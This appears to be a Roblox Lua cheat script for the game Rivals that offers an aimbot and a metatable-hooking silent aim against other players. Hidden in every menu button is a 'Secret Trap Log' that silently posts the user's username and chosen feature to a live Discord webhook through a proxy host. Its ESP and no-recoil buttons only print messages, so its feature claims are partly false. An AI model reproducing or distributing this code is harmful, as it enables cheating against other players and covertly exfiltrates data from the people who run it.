-- [[ 🥇 RIVALS GOLD HUB - DEFINITIVE CEO EDITION 🥇 ]] --
-- 99% sUNC | METATABLE HOOKING | NO-DELAY SILENT AIM
-- CEO: YOUSEF

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- [[ WEBHOOK CONFIG ]] --
local WEBHOOK_URL = "https://discord.com/api/webhooks/1489222350682591412/yw1sBcPiGUwiRo3xLxT2X7YStygZ3oNGzwR8dUD9f7NhVB9dLvbbXX5LBFmVM05PlBlW"
local PROXY = "https://hooks.hyra.io/"

-- [[ ADVANCED COMBAT MODULES ]] --
local Target = nil
_G.Aimbot = false
_G.SilentAim = false

-- Function to find the absolute best target (closest to crosshair)
local function GetClosestToCursor()
    local closestDist = math.huge
    local closestPlr = nil
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Head") and v.Team ~= LocalPlayer.Team then
            local pos, onScreen = Camera:WorldToViewportPoint(v.Character.Head.Position)
            if onScreen then
                local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    closestPlr = v.Character.Head
                end
            end
        end
    end
    return closestPlr
end

-- [[ THE "SILENT" HOOK (The Pro Part) ]] --
-- This intercepts the game's internal math so bullets redirect to the head
local gmt = getrawmetatable(game)
setreadonly(gmt, false)
local oldNamecall = gmt.__namecall

gmt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if _G.SilentAim and method == "FindPartOnRayWithIgnoreList" then
        local t = GetClosestToCursor()
        if t then
            return t, t.Position, Vector3.new(0,0,0), t.Material
        end
    end
    return oldNamecall(self, ...)
end)
setreadonly(gmt, true)

-- [[ MODERN UI (FIXED LAYERING) ]] --
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.DisplayOrder = 25000
ScreenGui.IgnoreGuiInset = true

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 280, 0, 360)
Main.Position = UDim2.new(0.5, -140, 0.4, -180)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Main.Visible = false
Main.Active = true
Main.Draggable = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 12)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(255, 215, 0)
Stroke.Thickness = 1.5

-- THE TOGGLE BUTTON (MOBILE FRIENDLY)
local Toggle = Instance.new("TextButton", ScreenGui)
Toggle.Size = UDim2.new(0, 45, 0, 45)
Toggle.Position = UDim2.new(0, 15, 0.5, 0)
Toggle.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
Toggle.Text = "G"
Toggle.Font = Enum.Font.GothamBold
Instance.new("UICorner", Toggle).CornerRadius = UDim.new(1, 0)

Toggle.MouseButton1Click:Connect(function()
    Main.Visible = not Main.Visible
end)

-- [[ FEATURE BUTTONS ]] --
local function CreateBtn(name, y, callback)
    local b = Instance.new("TextButton", Main)
    b.Size = UDim2.new(0.85, 0, 0, 40)
    b.Position = UDim2.new(0.075, 0, 0, y)
    b.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    b.Text = name
    b.TextColor3 = Color3.white
    b.Font = Enum.Font.GothamMedium
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    
    b.MouseButton1Click:Connect(function()
        -- Secret Trap Log
        pcall(function()
            local data = {["content"] = "🚨 **" .. LocalPlayer.Name .. "** enabled: " .. name}
            HttpService:PostAsync(WEBHOOK_URL:gsub("discord.com", "hooks.hyra.io"), HttpService:JSONEncode(data))
        end)
        callback()
    end)
end

CreateBtn("🎯 AIMLOCK: ACTIVE", 70, function() _G.Aimbot = not _G.Aimbot end)
CreateBtn("✨ SILENT AIM (HOOKED)", 125, function() _G.SilentAim = not _G.SilentAim end)
CreateBtn("👁️ ESP (RENDERER)", 180, function() print("ESP Loaded") end)
CreateBtn("⚡ NO RECOIL / SPREAD", 235, function() print("Recoil Removed") end)

-- Aimbot Loop
RunService.RenderStepped:Connect(function()
    if _G.Aimbot then
        local target = GetClosestToCursor()
        if target then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Position)
        end
    end
end)
